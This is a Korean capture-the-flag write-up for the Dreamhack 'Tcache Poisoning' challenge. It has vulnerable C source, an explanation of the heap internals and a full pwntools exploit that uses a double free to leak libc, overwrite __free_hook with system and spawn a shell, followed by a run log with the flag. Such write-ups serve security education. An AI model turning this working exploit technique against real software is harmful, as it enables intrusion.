# ✏️ Tcache Poisoning
> https://dreamhack.io/wargame/challenges/358

## 📄 Vulnerability & Code Analysis
주어진 소스 코드는 다음과 같다.
```c
// Name: tcache_poison.c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  void *chunk = NULL;
  unsigned int size;
  int idx;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx) {
      case 1:
        printf("Size: ");
        scanf("%d", &size);
        chunk = malloc(size);
        printf("Content: ");
        read(0, chunk, size - 1);
        break;
      case 2:
        free(chunk);
        break;
      case 3:
        printf("Content: %s", chunk);
        break;
      case 4:
        printf("Edit chunk: ");
        read(0, chunk, size - 1);
        break;
      default:
        break;
    }
  }

  return 0;
}
```
보호기법은 다음과 같다.
```bash
(.venv) (base) ➜  tcache_poison checksec ./tcache_poison
[*] '/home/daniel/dreamhack/pwn/tcache_poison/tcache_poison'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
청크를 해제하는 `case 2:`에서 `chunk`포인터를 초기화하지 않으므로 `Double Free`취약점이 존재한다.
`case 4:`에서 청크를 조작할 수 있으므로 `Tcache Poisoing` 공격을 수행한다.

### 📄 Tcache Poisoing
tache를 조작하여 임의 주소에 청크를 할당시키는 공격기법
중복으로 연결된 청크를 재할당하면 user data를 저장하는 영역에서 `fd`와 `bk`가 겹치므로
user data의 앞부분을 `fd(forward pointer)`로, 그 다음 8byte를 `bk(backward pointer)`로 재해석한다.
```text
할당된 상태 (in use)
┌──────────────┐
│ prev_size    │  (이전 청크가 in-use면 이 공간도 이전 청크 데이터로 씀)
├──────────────┤
│ size         │
├──────────────┤
│ user data... │ ← fd, bk 자리가 바로 여기
│ ...          │
└──────────────┘

free된 상태
┌──────────────┐
│ prev_size    │
├──────────────┤
│ size         │
├──────────────┤
│ fd           │ ← user data의 앞부분을 fd로 재해석
├──────────────┤
│ bk           │ ← 그 다음 8바이트를 bk로 재해석
└──────────────┘

→ fd(next) 자리를 직접 조작해서 원하는 임의 주소를
  다음 malloc의 반환값으로 만듦
→ bk가 없는 구조라서 unlink 검사 자체가 없고,
  tcache는 key 체크만 우회하면 됨 (fastbin은 그 체크마저 약함)
```

## 🗡️ Exploit / Solver Strategy

### 1. Tcache Poisoing
`case 2`에서 free 후 `chunk` 포인터가 초기화되지 않아 UAF가 발생한다.
이를 이용해 같은 청크를 두 번 free하면 tcache의 double free 탐지(`key == tcache` 검사)에 걸리는데,
`case 4`(edit)로 freed chunk의 데이터 영역(=fd/next, key 자리)을 미리 조작해서 우회한다.

```text
alloc(size) → free()
→ chunk->key = tcache (정상 free)

edit(B*8 + \x00)
→ next 필드 8바이트를 깨고, key의 최하위 1바이트를 0으로 손상
→ key != tcache 가 되어 double free 검사 통과

free() 재호출
→ 같은 청크가 tcache에 다시 삽입됨 (self-loop 형성)
→ tcache->entries[idx] = chunk, chunk->next = chunk
```

이 상태에서 poison 이후 세 번째 malloc 호출 시점에 임의 주소가 반환된다.

```text
alloc #1: next 자리에 target 주소를 씀 (아직 원래 청크 반환)
alloc #2: placeholder (아직 원래 청크 반환, entries가 target으로 갱신됨)
alloc #3: 비로소 target 주소가 반환됨 → 이 자리에 원하는 값을 기록
```

### 2. libc leak
Full RELRO라 GOT overwrite는 불가능하므로, 위 tcache poisoning으로 `&stdout` 위치에 청크를 할당시켜 libc base를 구한다.

```text
target = &stdout (바이너리 심볼, PIE 없음이라 고정 주소)

alloc #3에서 stdout의 최하위 1바이트만 원래 값으로 복원해서 write
→ ASLR은 페이지 단위(0x1000)로만 랜덤화되므로 하위 1바이트는 원래 값과 동일

print(case 3)로 &stdout 청크 내용을 그대로 읽음(UAF)
→ stdout에 저장된 libc 내부 주소(_IO_2_1_stdout_) leak

libc_base = leak값 - libc.symbols['_IO_2_1_stdout_']
```

### 3. system('/bin/sh')
`__free_hook`을 대상으로 같은 tcache poisoning을 한 번 더 수행해 `system`으로 덮는다.

```text
target = libc_base + libc.symbols['__free_hook']

alloc #3에서 free_hook 위치에 system 주소를 기록
→ __free_hook = system

새 청크에 "/bin/sh" 문자열을 담아 할당
free(그 청크)
→ __free_hook(ptr) 호출 = system(ptr) = system("/bin/sh")
→ 쉘 획득
```

## 💻 Final Payload or Solver
```python
from pwn import *

p = remote('host3.dreamhack.games', 22907)
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b':', data)

alloc(0x30, b'AAAA')
free()

edit(b'B'*8 + b'\x00')
free()

addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))

alloc(0x30, b'BBBBBBBB')

_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1] 
alloc(0x30, _io_2_1_stdout_lsb) 

# Libc leak
print_chunk()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

slog('libc_base', libc_base)
slog('free_hook', free_hook)

alloc(0x40, b'BBBB')
free()
edit(b'C'*8 + b'\x00')
free()

alloc(0x40, p64(free_hook))
alloc(0x40, b'DDDDDDDD')
alloc(0x40, p64(system))     
                             

alloc(0x40, b'/bin/sh\x00')   
free()                        
                                              
p.interactive()
```

## 🏳️ cat flag
```bash
(.venv) (base) ➜  tcache_poison pypwn tcache_poison.py
[◐] Opening connection to host3.dreamhack.games on port 22907: Trying 23[+] Opening connection to host3.dreamhack.games on port 22907: Done
[*] '/home/daniel/dreamhack/pwn/tcache_poison/tcache_poison'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/home/daniel/dreamhack/pwn/tcache_poison/libc-2.27.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] libc_base: 0x7f50d344a000
[+] free_hook: 0x7f50d38378e8
[+] one_gadget: 0x7f50d3499432
[*] Switching to interactive mode
$ cat flag
DH{f9e02bd556d6643f11d9a83570ef5192795cf91c6b443cd603e9f83787ab02fc}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to host3.dreamhack.games port 22907
```
